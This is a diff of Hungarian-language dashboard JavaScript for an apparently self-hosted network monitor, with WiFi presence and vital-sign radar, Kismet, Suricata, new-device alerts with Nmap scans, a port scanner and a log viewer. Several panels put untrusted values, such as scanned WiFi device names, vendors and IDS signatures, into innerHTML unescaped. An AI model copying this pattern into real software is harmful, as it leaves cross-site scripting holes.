+    if (body) body.innerHTML = '<div style="color:var(--red);font-size:.8rem;">Hiba a lekérdezésnél</div>';
+  });
+}
+fetchMobiles();
+setInterval(fetchMobiles, 60000);
+
+// ── WiFi Radar ────────────────────────────────────────────────────────────────
+function fetchWifiRadar() {
+  fetch('/api/wifi-radar').then(r => r.json()).then(resp => {
+    const dot   = el('radar-dot');
+    const badge = el('radar-badge');
+    const upd   = el('radar-last-upd');
+    const src   = el('radar-source-badge');
+    upd.textContent = new Date().toLocaleTimeString('hu-HU');
+    if (!resp || !resp.ok) {
+      dot.style.background = 'var(--red)';
+      badge.textContent = 'OFFLINE'; badge.className = 'badge-off';
+      if (src) src.textContent = (resp && resp.error) ? resp.error : 'Hiba';
+      return;
+    }
+    const d   = resp.data || {};
+    const cls = d.classification || {};
+    const vs  = d.vital_signs || {};
+    const nodes = d.nodes || [];
+    dot.style.background = 'var(--green)';
+    badge.textContent = 'AKTÍV'; badge.className = 'badge-on';
+    const isSimulate = (resp.source === 'simulate');
+    src.textContent = isSimulate ? '🔵 szimuláció' : '🟢 ESP32';
+    src.style.color  = isSimulate ? 'var(--blue)' : 'var(--green)';
+    const presIcon  = el('radar-presence-icon');
+    const presLabel = el('radar-presence-label');
+    const motionEl  = el('radar-motion');
+    if (cls.presence === true) {
+      presIcon.textContent  = '🧍';
+      presLabel.textContent = 'Jelenlét';
+      presLabel.style.color = 'var(--green)';
+    } else {
+      presIcon.textContent  = '🚫';
+      presLabel.textContent = 'Üres';
+      presLabel.style.color = 'var(--muted)';
+    }
+    const motionMap = {'present_still':'mozdulatlan','present_moving':'mozgásban','absent':'nincs senki','no_presence':'nincs senki'};
+    motionEl.textContent = motionMap[cls.motion_level] || (cls.motion_level || '—');
+    el('radar-persons').textContent = d.estimated_persons != null ? d.estimated_persons : '—';
+    const bpm = vs.breathing_rate_bpm, hpm = vs.heart_rate_bpm;
+    el('radar-breathing').textContent = bpm != null ? bpm.toFixed(1) : '—';
+    el('radar-heart').textContent     = hpm != null ? hpm.toFixed(1) : '—';
+    el('radar-breath-conf').textContent = vs.breathing_confidence != null ? `megbízhatóság: ${(vs.breathing_confidence*100).toFixed(0)}%` : '';
+    el('radar-heart-conf').textContent  = vs.heartbeat_confidence  != null ? `megbízhatóság: ${(vs.heartbeat_confidence*100).toFixed(0)}%`  : '';
+    const rssi = nodes.length > 0 ? nodes[0].rssi_dbm : null;
+    el('radar-rssi').textContent = rssi != null ? rssi.toFixed(0) : '—';
+    const sqPct = vs.signal_quality != null ? Math.round(vs.signal_quality * 100) : 0;
+    const fill = el('radar-quality-fill');
+    fill.style.width      = sqPct + '%';
+    fill.style.background = sqPct > 60 ? 'var(--green)' : sqPct > 30 ? 'var(--yellow)' : 'var(--red)';
+  }).catch(() => {
+    const dot = el('radar-dot'), badge = el('radar-badge');
+    if (dot)   dot.style.background = 'var(--red)';
+    if (badge) { badge.textContent = 'OFFLINE'; badge.className = 'badge-off'; }
+  });
+}
+fetchWifiRadar();
+setInterval(fetchWifiRadar, 10000);
+
+// ── Kismet WiFi Scanner ───────────────────────────────────────────────────────
+function fetchKismet() {
+  fetch('/api/kismet').then(r => r.json()).then(resp => {
+    const dot   = el('kismet-dot');
+    const badge = el('kismet-badge');
+    const upd   = el('kismet-last-upd');
+    upd.textContent = new Date().toLocaleTimeString('hu-HU');
+
+    if (!resp || !resp.ok) {
+      dot.style.background = 'var(--red)';
+      badge.textContent = 'OFFLINE'; badge.className = 'badge-off';
+      const src = el('kismet-src-status');
+      if (src) src.textContent = (resp && resp.error) ? resp.error.split(':')[0] : 'Hiba';
+      return;
+    }
+
+    dot.style.background = 'var(--green)';
+    badge.textContent = 'AKTÍV'; badge.className = 'badge-on';
+
+    el('kismet-total').textContent   = resp.total_devices ?? '—';
+    el('kismet-pkts').textContent    = (resp.packets_total ?? 0).toLocaleString('hu-HU');
+    el('kismet-pps').textContent     = (resp.packets_rps ?? 0) + ' pkt/s';
+
+    const devices = resp.devices || [];
+    const aps     = devices.filter(d => d.type && d.type.includes('AP')).length;
+    const clients = devices.filter(d => d.type && d.type.includes('Client')).length;
+    el('kismet-aps').textContent     = aps;
+    el('kismet-clients').textContent = clients;
+
+    const srcOk = resp.num_sources - (resp.num_errors || 0);
+    el('kismet-src-status').textContent = `${srcOk}/${resp.num_sources} forrás aktív`;
+    el('kismet-src-status').style.color = resp.num_errors > 0 ? 'var(--yellow)' : 'var(--green)';
+
+    const list = el('kismet-devices-list');
+    if (devices.length === 0) {
+      list.innerHTML = '<div style="color:var(--muted);font-size:.78rem;">Gyűjtés folyamatban...</div>';
+      return;
+    }
+    list.innerHTML = `
+      <div style="display:grid;grid-template-columns:140px 1fr 90px 55px 50px;gap:0 10px;font-size:.7rem;color:var(--muted);padding:0 2px 4px;border-bottom:1px solid var(--border);">
+        <span>MAC</span><span>Név / Gyártó</span><span>Típus</span><span>Jel</span><span>Csatorna</span>
+      </div>` +
+      devices.slice(0, 15).map(d => {
+        const sigCol = d.signal >= -50 ? 'var(--green)' : d.signal >= -70 ? 'var(--yellow)' : 'var(--red)';
+        const typeShort = (d.type || '?').replace('Wi-Fi ','').replace('Bridged','Brdg');
+        return `<div style="display:grid;grid-template-columns:140px 1fr 90px 55px 50px;gap:0 10px;padding:3px 2px;border-bottom:1px solid var(--border)22;align-items:center;">
+          <span style="font-family:monospace;font-size:.68rem;color:var(--muted);">${d.mac}</span>
+          <div style="overflow:hidden;">
+            <div style="font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${d.name || d.mac}</div>
+            <div style="font-size:.65rem;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${d.manuf || '?'}</div>
+          </div>
+          <span style="font-size:.68rem;color:var(--blue);">${typeShort}</span>
+          <span style="font-weight:700;color:${sigCol};">${d.signal} dBm</span>
+          <span style="color:var(--muted);">ch${d.channel || '?'}</span>
+        </div>`;
+      }).join('');
+  }).catch(() => {
+    const dot = el('kismet-dot'), badge = el('kismet-badge');
+    if (dot)   dot.style.background = 'var(--red)';
+    if (badge) { badge.textContent = 'OFFLINE'; badge.className = 'badge-off'; }
+  });
+}
+fetchKismet();
+setInterval(fetchKismet, 15000);
+
+
+
+// ── IDS / Suricata stats ──────────────────────────────────────────────────────
+function fetchIdsStats() {
+  fetch('/api/ids-stats').then(r => r.json()).then(d => {
+    const dot    = el('ids-dot');
+    const run    = el('ids-running');
+    const total  = el('ids-total-badge');
+    const wazuh  = el('ids-wazuh-badge');
+    const crit   = el('ids-critical');
+    const high   = el('ids-high');
+    const med    = el('ids-medium');
+    const upd    = el('ids-last-upd');
+    const sigs   = el('ids-top-sigs');
+    if (!dot) return;
+
+    const running = d.suricata_running;
+    dot.style.background = running ? 'var(--green)' : 'var(--red)';
+    run.textContent = running ? '● fut' : '○ leállva';
+    run.style.color = running ? 'var(--green)' : 'var(--red)';
+
+    total.textContent = `${d.total} alert`;
+    total.className = d.critical > 0 ? 'badge-off' : (d.high > 0 ? 'badge-warn' : 'badge-on');
+    wazuh.textContent = `Wazuh: ${d.wazuh_total}`;
+    crit.textContent = d.critical;
+    high.textContent = d.high;
+    med.textContent  = d.medium;
+    upd.textContent  = new Date().toLocaleTimeString('hu-HU');
+
+    if (d.top_sig && d.top_sig.length) {
+      sigs.innerHTML = '<div style="font-size:.7rem;color:var(--muted);margin-bottom:4px;">Top aláírások:</div>' +
+        d.top_sig.map(([sig, cnt]) =>
+          `<div style="display:flex;justify-content:space-between;gap:8px;padding:1px 0;">
+            <span style="white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:320px;color:var(--fg);">${sig}</span>
+            <span style="flex-shrink:0;color:var(--blue);font-weight:600;">${cnt}×</span>
+          </div>`
+        ).join('');
+    }
+  }).catch(() => {});
+}
+fetchIdsStats();
+setInterval(fetchIdsStats, 30000);
+
+// ── Új eszköz riasztás ────────────────────────────────────────────────────────
+const _shownDeviceAlerts = new Set();
+
+function showDeviceAlert(a) {
+  if (_shownDeviceAlerts.has(a.id)) return;
+  _shownDeviceAlerts.add(a.id);
+
+  const riskColor = {high:'#f85149', medium:'#e3b341', low:'#3fb950', unknown:'#8b949e'};
+  const riskLabel = {high:'MAGAS RIZIKÓ', medium:'KÖZEPES RIZIKÓ', low:'ALACSONY RIZIKÓ', unknown:'ISMERETLEN'};
+  const col = riskColor[a.risk] || '#8b949e';
+  const lbl = riskLabel[a.risk] || a.risk;
+  const ts  = new Date(a.ts * 1000).toLocaleTimeString('hu-HU');
+
+  // Toast értesítés
+  const toast = document.createElement('div');
+  toast.style.cssText = `position:fixed;bottom:24px;right:24px;z-index:9999;
+    background:#161b22;border:1px solid ${col};border-radius:8px;
+    padding:14px 18px;min-width:300px;max-width:420px;
+    box-shadow:0 4px 24px rgba(0,0,0,.6);cursor:pointer;`;
+  toast.innerHTML = `
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+      <b style="color:${col}">🔍 Új eszköz a hálózaton</b>
+      <span style="color:#8b949e;font-size:.75rem">${ts}</span>
+    </div>
+    <div style="font-size:.85rem;color:#c9d1d9">
+      <b>${a.vendor}</b><br>
+      IP: <code>${a.ip}</code> &nbsp; MAC: <code>${a.mac}</code>
+    </div>
+    <div style="margin-top:8px;display:flex;gap:8px">
+      <span style="background:${col}22;color:${col};border-radius:4px;padding:2px 8px;font-size:.75rem;font-weight:600">${lbl}</span>
+      <span style="color:#8b949e;font-size:.75rem;cursor:pointer;margin-left:auto" onclick="this.closest('div[style]').remove()">✕ bezár</span>
+    </div>`;
+  toast.onclick = (e) => { if (e.target.tagName !== 'SPAN') showDeviceModal(a); toast.remove(); };
+  document.body.appendChild(toast);
+  setTimeout(() => { if (toast.isConnected) toast.remove(); }, 15000);
+
+  // Browser értesítés
+  if (Notification.permission === 'granted') {
+    new Notification(`🔍 Új eszköz: ${a.vendor}`, {
+      body: `IP: ${a.ip}\nMAC: ${a.mac}\nRizikó: ${lbl}`, icon: ''
+    });
+  }
+}
+
+function showDeviceModal(a) {
+  const riskColor = {high:'#f85149', medium:'#e3b341', low:'#3fb950', unknown:'#8b949e'};
+  const col = riskColor[a.risk] || '#8b949e';
+  const ts  = new Date(a.ts * 1000).toLocaleString('hu-HU');
+  const existing = document.getElementById('device-modal');
+  if (existing) existing.remove();
+
+  const m = document.createElement('div');
+  m.id = 'device-modal';
+  m.style.cssText = `position:fixed;inset:0;z-index:10000;background:rgba(0,0,0,.7);
+    display:flex;align-items:center;justify-content:center;`;
+  m.innerHTML = `
+    <div style="background:#161b22;border:1px solid #30363d;border-radius:10px;
+      padding:24px;max-width:600px;width:90%;max-height:80vh;overflow-y:auto;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
+        <h3 style="margin:0;color:#c9d1d9">🔍 Új eszköz vizsgálat</h3>
+        <button onclick="document.getElementById('device-modal').remove()"
+          style="background:none;border:none;color:#8b949e;font-size:1.2rem;cursor:pointer">✕</button>
+      </div>
+      <table style="width:100%;border-collapse:collapse;margin-bottom:16px;font-size:.85rem">
+        <tr><td style="color:#8b949e;padding:4px 8px">Gyártó</td><td style="color:#c9d1d9;padding:4px 8px"><b>${a.vendor}</b></td></tr>
+        <tr><td style="color:#8b949e;padding:4px 8px">IP cím</td><td style="color:#c9d1d9;padding:4px 8px"><code>${a.ip}</code></td></tr>
+        <tr><td style="color:#8b949e;padding:4px 8px">MAC cím</td><td style="color:#c9d1d9;padding:4px 8px"><code>${a.mac}</code></td></tr>
+        <tr><td style="color:#8b949e;padding:4px 8px">Észlelve</td><td style="color:#c9d1d9;padding:4px 8px">${ts}</td></tr>
+        <tr><td style="color:#8b949e;padding:4px 8px">Rizikó</td>
+          <td style="padding:4px 8px"><span style="background:${col}22;color:${col};border-radius:4px;padding:2px 8px;font-size:.75rem;font-weight:600">${a.risk.toUpperCase()}</span></td></tr>
+      </table>
+      <div style="margin-bottom:12px">
+        <div style="color:#8b949e;font-size:.75rem;margin-bottom:6px">Nmap scan eredmény:</div>
+        <pre style="background:#0d1117;border:1px solid #30363d;border-radius:6px;
+          padding:12px;font-size:.78rem;color:#c9d1d9;overflow-x:auto;white-space:pre-wrap;max-height:220px;overflow-y:auto">${a.scan || 'Nincs adat'}</pre>
+      </div>
+      <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
+        <input id="dev-label-${a.id}" placeholder="Eszköz neve (pl. TV box)"
+          style="flex:1;min-width:140px;background:#0d1117;border:1px solid #30363d;
+          border-radius:6px;padding:6px 10px;color:#c9d1d9;font-size:.85rem">
+        <button onclick="approveDevice('${a.mac}','${a.id}')"
+          style="background:#238636;border:none;border-radius:6px;padding:7px 16px;
+          color:#fff;cursor:pointer;font-size:.85rem">✓ Jóváhagyás</button>
+        <button onclick="rescanDevice('${a.ip}','${a.id}')"
+          style="background:#1f6feb;border:none;border-radius:6px;padding:7px 16px;
+          color:#fff;cursor:pointer;font-size:.85rem">↺ Újrascan</button>
+      </div>
+    </div>`;
+  document.body.appendChild(m);
+  m.addEventListener('click', e => { if (e.target === m) m.remove(); });
+}
+
+async function approveDevice(mac, alertId) {
+  const label = (document.getElementById(`dev-label-${alertId}`) || {}).value || '';
+  await fetch('/api/known-devices/approve', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({mac, label})
+  });
+  document.getElementById('device-modal')?.remove();
+  showToast(`✓ Eszköz jóváhagyva: ${mac}`, 'green');
+}
+
+function showToast(msg, color) {
+  const t = document.createElement('div');
+  t.style.cssText = `position:fixed;bottom:24px;left:50%;transform:translateX(-50%);
+    z-index:10001;background:#161b22;border:1px solid var(--${color === 'green' ? 'green' : 'red'});
+    border-radius:6px;padding:10px 20px;color:#c9d1d9;font-size:.85rem;
+    box-shadow:0 2px 12px rgba(0,0,0,.5)`;
+  t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 3000);
+}
+
+async function rescanDevice(ip, alertId) {
+  const pre = document.querySelector(`#device-modal pre`);
+  if (pre) pre.textContent = 'Scan folyamatban...';
+  try {
+    const r = await fetch('/api/device-rescan', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ip})
+    });
+    const d = await r.json();
+    if (pre) pre.textContent = d.scan || 'Nincs eredmény';
+  } catch(e) {
+    if (pre) pre.textContent = 'Hiba: ' + e;
+  }
+}
+// ── Alert rendszer ───────────────────────────────────────────────────────────
+const _notified        = {};
+const _bannerTimers    = {};
+const _dismissedBanners = new Set();
+const _mutedMachines   = new Set(JSON.parse(localStorage.getItem('muted_machines') || '[]'));
+
+function handleAlerts(mid, label, alerts) {
+  const card   = el(`card-${mid}`);
+  const bar    = el(`alert-bar-${mid}`);
+  const txt    = el(`alert-txt-${mid}`);
+  const banner = el('alert-banner');
+
+  // Elnémított gép: minden alertet elnyomunk
+  if (_mutedMachines.has(mid)) {
+    if (card) card.classList.remove('alert-active');
+    if (bar)  bar.style.display = 'none';
+    const existing = el(`banner-${mid}`);
+    if (existing) { existing.remove(); _checkBanner(); }
+    return;
+  }
+
+  if (alerts && alerts.length > 0) {
+    if (card) card.classList.add('alert-active');
+    if (bar)  bar.style.display = 'flex';
+    if (txt)  txt.textContent = alerts.join('  |  ');
+
+    const bid = `banner-${mid}`;
+    if (!el(bid) && !_dismissedBanners.has(mid)) {
+      const div = document.createElement('div');
+      div.className = 'banner-item';
+      div.id = bid;
+      div.innerHTML = `<span>⚠ <b>${label}</b>: ${alerts.join(', ')}</span>` +
+        `<button onclick="dismissBanner('${bid}','${mid}')">✕</button>`;
+      banner.appendChild(div);
+      banner.style.display = 'block';
+      // Auto-eltűnés 3 mp után
+      if (_bannerTimers[mid]) clearTimeout(_bannerTimers[mid]);
+      _bannerTimers[mid] = setTimeout(() => dismissBanner(bid, mid), 3000);
+    } else if (el(bid)) {
+      el(bid).querySelector('span').innerHTML = `⚠ <b>${label}</b>: ${alerts.join(', ')}`;
+    }
+
+    if (!_notified[mid] && Notification.permission === 'granted') {
+      new Notification(`⚠ NOX Alert — ${label}`, { body: alerts.join('\n'), icon: '' });
+      _notified[mid] = true;
+    }
+  } else {
+    if (card) card.classList.remove('alert-active');
+    if (bar)  bar.style.display = 'none';
+    _notified[mid] = false;
+    _dismissedBanners.delete(mid);
+    if (_bannerTimers[mid]) { clearTimeout(_bannerTimers[mid]); delete _bannerTimers[mid]; }
+    const bid = el(`banner-${mid}`);
+    if (bid) { bid.remove(); _checkBanner(); }
+  }
+}
+
+function dismissBanner(id, mid) {
+  if (mid && _bannerTimers[mid]) { clearTimeout(_bannerTimers[mid]); delete _bannerTimers[mid]; }
+  if (mid) _dismissedBanners.add(mid);
+  const b = el(id); if (b) b.remove();
+  _checkBanner();
+}
+
+function _checkBanner() {
+  const banner = el('alert-banner');
+  if (banner && !banner.children.length) banner.style.display = 'none';
+}
+
+// ── Értesítés elnémítás ──────────────────────────────────────────────────────
+function toggleMute(mid) {
+  if (_mutedMachines.has(mid)) {
+    _mutedMachines.delete(mid);
+  } else {
+    _mutedMachines.add(mid);
+    const card = el(`card-${mid}`);
+    if (card) card.classList.remove('alert-active');
+    const bar = el(`alert-bar-${mid}`);
+    if (bar)  bar.style.display = 'none';
+    const bid = el(`banner-${mid}`);
+    if (bid)  { bid.remove(); _checkBanner(); }
+  }
+  localStorage.setItem('muted_machines', JSON.stringify([..._mutedMachines]));
+  _updateMuteBtn(mid);
+}
+
+function _updateMuteBtn(mid) {
+  const btn = el(`mute-${mid}`);
+  if (!btn) return;
+  const muted = _mutedMachines.has(mid);
+  btn.textContent = muted ? '🔕' : '🔔';
+  btn.title  = muted ? 'Értesítések visszakapcsolása' : 'Értesítések elnémítása';
+  btn.style.borderColor = muted ? 'var(--yellow)' : 'var(--border)';
+  btn.style.color       = muted ? 'var(--yellow)' : 'var(--muted)';
+  btn.style.opacity     = muted ? '1' : '0.5';
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  {% for mid, m in machines.items() %}
+  {% if not m.get('type') == 'router' %}
+  (function(){
+    const mid = '{{mid}}';
+    const grp = el('card-'+mid)?.querySelector('.d-flex.gap-1.mt-1');
+    if (!grp) return;
+    const btn = document.createElement('button');
+    btn.id        = 'mute-' + mid;
+    btn.className = 'btn-ssh';
+    btn.style.cssText = 'font-size:.75rem;padding:1px 7px;';
+    btn.onclick   = () => toggleMute(mid);
+    grp.prepend(btn);
+    _updateMuteBtn(mid);
+  })();
+  {% endif %}
+  {% endfor %}
+});
+
+// Böngésző értesítési engedély kérése
+if (Notification.permission === 'default') Notification.requestPermission();
+
+// ── QR kód ───────────────────────────────────────────────────────────────────
+function openQR() {
+  const url = 'http://100.75.31.41:8888';
+  document.getElementById('qr-url').textContent = url;
+  new bootstrap.Modal(document.getElementById('qrModal')).show();
+  setTimeout(() => {
+    QRCode.toCanvas(document.getElementById('qr-canvas'), url, {
+      width: 220, margin: 1,
+      color: { dark: '#000000', light: '#ffffff' },
+    });
+  }, 200);
+}
+
+function copyQrUrl() {
+  navigator.clipboard.writeText('http://100.75.31.41:8888').then(() => {
+    const el = document.getElementById('qr-copied');
+    el.style.display = 'block';
+    setTimeout(() => el.style.display = 'none', 2000);
+  });
+}
+
+// ── Dark/Light toggle ────────────────────────────────────────────────────────
+function toggleTheme() {
+  const light = document.body.classList.toggle('light');
+  document.getElementById('theme-btn').textContent = light ? '☀️' : '🌙';
+  localStorage.setItem('theme', light ? 'light' : 'dark');
+}
+(function() {
+  if (localStorage.getItem('theme') === 'light') {
+    document.body.classList.add('light');
+    document.getElementById('theme-btn').textContent = '☀️';
+  }
+})();
+
+connectStats();
+
+// ── Hálózati térkép ──────────────────────────────────────────────────────────
+let netNetwork = null;
+
+const GROUP_STYLES = {
+  local:        { color:{background:'#1f6feb',border:'#58a6ff'}, font:{color:'#fff'}, shape:'diamond' },
+  online:       { color:{background:'#1a4a1f',border:'#3fb950'}, font:{color:'#3fb950'}, shape:'box' },
+  offline:      { color:{background:'#3d1a1a',border:'#f85149'}, font:{color:'#f85149'}, shape:'box' },
+  gateway:      { color:{background:'#21262d',border:'#8b949e'}, font:{color:'#8b949e'}, shape:'database' },
+  tailscale_hub:{ color:{background:'#2d1f5e',border:'#bc8cff'}, font:{color:'#bc8cff'}, shape:'ellipse' },
+};
+
+function loadNetMap() {
+  const statusEl = document.getElementById('net-scan-status');
+  statusEl.textContent = 'Szkennelés...';
+
+  fetch('/api/network').then(r => r.json()).then(data => {
+    const nodes = new vis.DataSet(data.nodes.map(n => ({
+      ...n,
+      ...( GROUP_STYLES[n.group] || GROUP_STYLES.online ),
+      borderWidth: 2,
+      font: { ...(GROUP_STYLES[n.group]||{}).font, face:'Consolas', size:13 },
+    })));
+
+    const edges = new vis.DataSet(data.edges.map((e,i) => ({
+      id: i,
+      from: e.from,
+      to: e.to,
+      label: e.label || '',
+      dashes: e.dashes,
+      color: { color: e.dashes ? '#bc8cff' : '#58a6ff', opacity: 0.7 },
+      font: { color:'#8b949e', size:11, face:'Consolas', align:'middle' },
+      width: 2,
+      smooth: { type:'curvedCW', roundness: 0.15 },
+    })));
+
+    const container = document.getElementById('net-map');
+    const options = {
+      nodes: { borderWidth:2, margin:10 },
+      edges: { arrows:{ to:{ enabled:true, scaleFactor:0.6 } } },
+      physics: {
+        enabled: true,
+        solver: 'forceAtlas2Based',
+        forceAtlas2Based: { gravitationalConstant:-60, springLength:140 },
+        stabilization: { iterations:150 },
+      },
+      layout: { improvedLayout: true },
+      interaction: { hover:true, tooltipDelay:100 },
+      background: { color:'#0d1117' },
+    };
+
+    if (netNetwork) netNetwork.destroy();
+    netNetwork = new vis.Network(container, { nodes, edges }, options);
+    netNetwork.on('stabilizationIterationsDone', () => {
+      netNetwork.setOptions({ physics:{ enabled:false } });
+    });
+
+    const now = new Date().toLocaleTimeString('hu-HU');
+    statusEl.textContent = `Utolsó szkenn: ${now}`;
+  }).catch(() => {
+    statusEl.textContent = 'Hiba a betöltéskor';
+  });
+}
+
+function openNetMap() {
+  const modal = new bootstrap.Modal(document.getElementById('netModal'));
+  modal.show();
+  setTimeout(loadNetMap, 300);
+}
+
+// ── Grafikonok ───────────────────────────────────────────────────────────────
+const _charts  = {};
+const _history = {};
+const MAX_PTS  = 60;
+
+Chart.defaults.color = '#8b949e';
+Chart.defaults.font.family = 'Consolas, Monaco, monospace';
+
+function _initChart(mid) {
+  const ctx = document.getElementById(`chart-${mid}`);
+  if (!ctx || _charts[mid]) return;
+  _history[mid] = { cpu: [], ram: [], labels: [] };
+  _charts[mid] = new Chart(ctx, {
+    type: 'line',
+    data: {
+      labels: [],
+      datasets: [
+        { label:'CPU', data:[], borderColor:'#58a6ff', backgroundColor:'#58a6ff15',
+          fill:true, tension:0.4, pointRadius:0, borderWidth:1.5 },
+        { label:'RAM', data:[], borderColor:'#f0883e', backgroundColor:'#f0883e15',
+          fill:true, tension:0.4, pointRadius:0, borderWidth:1.5 },
+      ],
+    },
+    options: {
+      responsive: true,
+      maintainAspectRatio: false,
+      animation: false,
+      interaction: { mode:'index', intersect:false },
+      plugins: {
+        legend: { display:false },
+        tooltip: {
+          backgroundColor:'#161b22',
+          borderColor:'#30363d',
+          borderWidth:1,
+          callbacks: { label: c => ` ${c.dataset.label}: ${c.parsed.y.toFixed(1)}%` },
+        },
+      },
+      scales: {
+        x: { display:false },
+        y: {
+          min:0, max:100,
+          grid: { color:'#30363d22', lineWidth:0.5 },
+          ticks: { color:'#8b949e', font:{size:9}, maxTicksLimit:3,
+                   callback: v => v+'%' },
+          border: { display:false },
+        },
+      },
+    },
+  });
+}
+
+function _updateChart(mid, cpu, ram) {
+  if (!_charts[mid]) _initChart(mid);
+  const h = _history[mid];
+  if (!h) return;
+  h.cpu.push(parseFloat(cpu.toFixed(1)));
+  h.ram.push(parseFloat(ram.toFixed(1)));
+  h.labels.push('');
+  if (h.cpu.length > MAX_PTS) { h.cpu.shift(); h.ram.shift(); h.labels.shift(); }
+  const ch = _charts[mid];
+  ch.data.labels        = h.labels;
+  ch.data.datasets[0].data = h.cpu;
+  ch.data.datasets[1].data = h.ram;
+  ch.update('none');
+}
+
+// ── Port Scanner ─────────────────────────────────────────────────────────────
+let _scanWs = null;
+
+function openScanner() {
+  new bootstrap.Modal(document.getElementById('scanModal')).show();
+  document.getElementById('scanModal').addEventListener('hidden.bs.modal', stopScan, {once:true});
+}
+
+function setScanTarget(ip) {
+  document.getElementById('scan-target').value = ip;
+}
+
+function colorScanLine(raw) {
+  let s = raw.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  if (/\d+\/\w+\s+open/i.test(s))
+    return `<span style="color:var(--green);font-weight:bold;">${s}</span>`;
+  if (/\d+\/\w+\s+filtered/i.test(s))
+    return `<span style="color:var(--yellow);">${s}</span>`;
+  if (/\d+\/\w+\s+closed/i.test(s))
+    return `<span style="color:var(--muted);">${s}</span>`;
+  if (/Nmap scan report|Host is up/i.test(s))
+    return `<span style="color:var(--blue);font-weight:bold;">${s}</span>`;
+  if (/MAC Address/i.test(s))
+    return `<span style="color:var(--purple);">${s}</span>`;
+  if (/Service Info|OS details|Running:/i.test(s))
+    return `<span style="color:var(--orange);">${s}</span>`;
+  if (/^\[NOX\]/i.test(s))
+    return `<span style="color:var(--muted);font-style:italic;">${s}</span>`;
+  if (/error|warning/i.test(s))
+    return `<span style="color:var(--red);">${s}</span>`;
+  return s;
+}
+
+function startScan() {
+  const target = document.getElementById('scan-target').value.trim();
+  const type   = document.getElementById('scan-type').value;
+  if (!target) { alert('Adj meg egy célt!'); return; }
+
+  stopScan();
+
+  const out    = document.getElementById('scan-output');
+  const status = document.getElementById('scan-status');
+  out.innerHTML = '';
+  document.getElementById('scan-start-btn').style.display = 'none';
+  document.getElementById('scan-stop-btn').style.display  = 'inline-block';
+  status.textContent = '⏳ Szkennelés...';
+  const t0 = Date.now();
+
+  _scanWs = new WebSocket(`ws://${location.host}/ws/scan`);
+
+  _scanWs.onopen = () => {
+    _scanWs.send(JSON.stringify({ target, type }));
+  };
+
+  _scanWs.onmessage = evt => {
+    try {
+      const data = JSON.parse(evt.data);
+      if (data.done) {
+        const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
+        status.textContent = `✓ Kész — ${elapsed}s`;
+        document.getElementById('scan-start-btn').style.display = 'inline-block';
+        document.getElementById('scan-stop-btn').style.display  = 'none';
+        return;
+      }
+    } catch {}
+    const line = evt.data;
+    out.innerHTML += colorScanLine(line);
+    out.scrollTop = out.scrollHeight;
+  };
+
+  _scanWs.onclose = () => {
+    document.getElementById('scan-start-btn').style.display = 'inline-block';
+    document.getElementById('scan-stop-btn').style.display  = 'none';
+    if (status.textContent === '⏳ Szkennelés...') status.textContent = 'Leállítva';
+  };
+
+  _scanWs.onerror = () => {
+    status.textContent = '❌ WebSocket hiba';
+    document.getElementById('scan-start-btn').style.display = 'inline-block';
+    document.getElementById('scan-stop-btn').style.display  = 'none';
+  };
+}
+
+function stopScan() {
+  if (_scanWs) { _scanWs.close(); _scanWs = null; }
+  document.getElementById('scan-start-btn').style.display = 'inline-block';
+  document.getElementById('scan-stop-btn').style.display  = 'none';
+}
+
+// ── Log néző ─────────────────────────────────────────────────────────────────
+let _logAutoTimer = null;
+let _logRawContent = '';
+
+function openLogs(mid) {
+  if (mid) document.getElementById('log-machine').value = mid;
+  document.getElementById('log-auto').checked = false;
+  document.getElementById('log-search').value = '';
+  new bootstrap.Modal(document.getElementById('logModal')).show();
+  loadLog();
+  document.getElementById('logModal').addEventListener('hidden.bs.modal', () => {
+    clearInterval(_logAutoTimer); _logAutoTimer = null;
+  }, {once:true});
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('log-file').addEventListener('change', function() {
+    const customInput = document.getElementById('log-custom');
+    customInput.style.display = this.value === 'custom' ? 'inline-block' : 'none';
+  });
+});
+
+function loadLog() {
+  const mid   = document.getElementById('log-machine').value;
+  const fsel  = document.getElementById('log-file').value;
+  const file  = fsel === 'custom' ? document.getElementById('log-custom').value : fsel;
+  const lines = document.getElementById('log-lines').value;
+  const out   = document.getElementById('log-output');
+  if (!file || file === 'custom') return;
+
+  out.innerHTML = '<span style="color:#8b949e">⏳ Betöltés...</span>';
+
+  fetch(`/api/logs/${mid}?file=${encodeURIComponent(file)}&lines=${lines}`)
+    .then(r => r.json())
+    .then(data => {
+      if (data.error) {
+        out.innerHTML = `<span style="color:var(--red)">❌ ${data.error}</span>`;
+        return;
+      }
+      _logRawContent = data.content || '';
+      renderLog();
+    })
+    .catch(() => { out.innerHTML = '<span style="color:var(--red)">❌ Hálózati hiba</span>'; });
+}
+
+function renderLog() {
+  const out = document.getElementById('log-output');
+  const q   = document.getElementById('log-search').value;
+
+  const lines = _logRawContent.split('\n').map(line => {
+    // Escape HTML
+    let safe = line.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+    // Color coding
+    if (/error|fail|critical|crit|emerg/i.test(safe))
+      safe = `<span style="color:#f85149">${safe}</span>`;
+    else if (/warn|warning/i.test(safe))
+      safe = `<span style="color:#d29922">${safe}</span>`;
+    else if (/\binfo\b|notice|started|success|ok\b/i.test(safe))
+      safe = `<span style="color:#3fb950">${safe}</span>`;
+    else if (/^\d{4}-\d{2}|^[A-Z][a-z]{2}\s+\d/.test(safe))
+      safe = `<span style="color:#8b949e">${safe.substring(0,15)}</span>${safe.substring(15)}`;
+
+    // Keresés kiemelése
+    if (q) {
+      const re = new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'), 'gi');
+      safe = safe.replace(re, m => `<mark style="background:#d2992270;color:#fff;border-radius:2px;">${m}</mark>`);
+    }
+    return safe;
+  });
+
